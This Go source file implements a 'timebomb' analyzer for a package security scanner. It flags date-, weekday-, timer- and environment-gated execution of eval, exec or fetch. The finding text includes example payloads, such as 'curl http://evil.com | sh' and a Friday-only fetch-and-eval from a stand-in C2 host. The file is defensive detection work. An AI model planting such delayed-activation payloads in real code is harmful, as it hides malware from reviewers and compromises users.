package analyzer

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
)

// TimeBombAnalyzer detects time-based and conditional payload activation
// patterns used by malware to evade detection during security review.
// Based on Datadog/Checkmarx research on delayed activation supply chain attacks.
type TimeBombAnalyzer struct{}

func NewTimeBombAnalyzer() *TimeBombAnalyzer {
	return &TimeBombAnalyzer{}
}

func (a *TimeBombAnalyzer) Name() string {
	return "timebomb"
}

var (
	// Date constructor with specific date string: new Date('2025-...')
	dateConstructorPattern = regexp.MustCompile(`new\s+Date\s*\(\s*['"][0-9]{4}-[0-9]{2}`)

	// Date method calls for day/hour checking: getDay(), getHours(), getMonth()
	dateMethodPattern = regexp.MustCompile(`\.get(?:Day|Hours|Month|FullYear|Date|Minutes)\s*\(\s*\)`)

	// setTimeout/setInterval with large numeric delay (>= 1 hour = 3600000ms)
	setTimeoutPattern = regexp.MustCompile(`set(?:Timeout|Interval)\s*\([^,]+,\s*(\d{7,})`)

	// Environment-conditional execution: process.env.NODE_ENV === 'production'
	envConditionalPattern = regexp.MustCompile(`process\.env\.\w+\s*===?\s*['"](?:production|prod|staging)['"]`)

	// Dangerous operations that are suspicious when combined with conditions
	dangerousOpPattern = regexp.MustCompile(`(?:eval|exec|execSync|spawn|Function)\s*\(`)
)

func (a *TimeBombAnalyzer) scanContent(content string, filename string) []Finding {
	var findings []Finding

	hasDangerousOp := dangerousOpPattern.MatchString(content) ||
		strings.Contains(content, "fetch(") ||
		strings.Contains(content, "require('child_process')")

	// Date-based time bomb: specific date comparisons with dangerous operations
	if dateConstructorPattern.MatchString(content) && hasDangerousOp {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Time-bomb: date-based conditional execution",
			Description: fmt.Sprintf("File %q compares against a specific date and contains dangerous operations. This pattern is used to activate payloads after a security review window.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Time-bomb activation:\n" +
				"    if (new Date() > new Date('2025-01-15')) {\n" +
				"        exec('curl http://evil.com | sh');\n" +
				"    }\n" +
				"    Payload activates after the review period ends.",
			Remediation: "Investigate what code executes after the date check. This is a strong indicator of delayed malware activation.",
		})
	}

	// Day/time-based conditional execution
	if dateMethodPattern.MatchString(content) && hasDangerousOp {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Time-based conditional: date/time method checks",
			Description: fmt.Sprintf("File %q checks day/time and contains dangerous operations. Malware uses this to activate only on certain days to avoid CI/CD detection.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "Weekday-triggered payload:\n" +
				"    if (new Date().getDay() === 5) {\n" +
				"        fetch('https://c2.example.com/payload').then(eval);\n" +
				"    }\n" +
				"    Only activates on Fridays, evading weekday CI runs.",
			Remediation: "Examine what operations are gated behind the time check.",
		})
	}

	// Suspiciously long setTimeout/setInterval delays
	matches := setTimeoutPattern.FindAllStringSubmatch(content, -1)
	for _, m := range matches {
		delay, err := strconv.ParseInt(m[1], 10, 64)
		if err != nil {
			continue
		}
		if delay >= 3600000 { // >= 1 hour
			findings = append(findings, Finding{
				Analyzer:    a.Name(),
				Title:       fmt.Sprintf("Delayed execution: %dms timer (~%dh)", delay, delay/3600000),
				Description: fmt.Sprintf("File %q sets a timer with %dms delay (%.1f hours). Long delays are used to execute payloads after installation monitoring ends.", filename, delay, float64(delay)/3600000),
				Severity:    SeverityHigh,
				ExploitExample: "Delayed payload:\n" +
					"    setTimeout(() => {\n" +
					"        require('child_process').exec('whoami');\n" +
					"    }, 86400000); // 24 hours\n" +
					"    Payload fires long after npm install completes.",
				Remediation: "Investigate what code runs after the delay. Legitimate packages rarely use multi-hour timers.",
			})
		}
	}

	// Environment-conditional payload (production-only execution)
	if envConditionalPattern.MatchString(content) && hasDangerousOp {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Conditional payload: environment-gated execution",
			Description: fmt.Sprintf("File %q only executes dangerous operations in specific environments (production/staging). This evades detection during development and CI testing.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "Production-only payload:\n" +
				"    if (process.env.NODE_ENV === 'production') {\n" +
				"        eval(atob('bWFsaWNpb3VzX2NvZGU='));\n" +
				"    }\n" +
				"    Only activates in production, never during testing.",
			Remediation: "Review what operations are restricted to production. Legitimate code should not gate eval/exec behind environment checks.",
		})
	}

	return findings
}
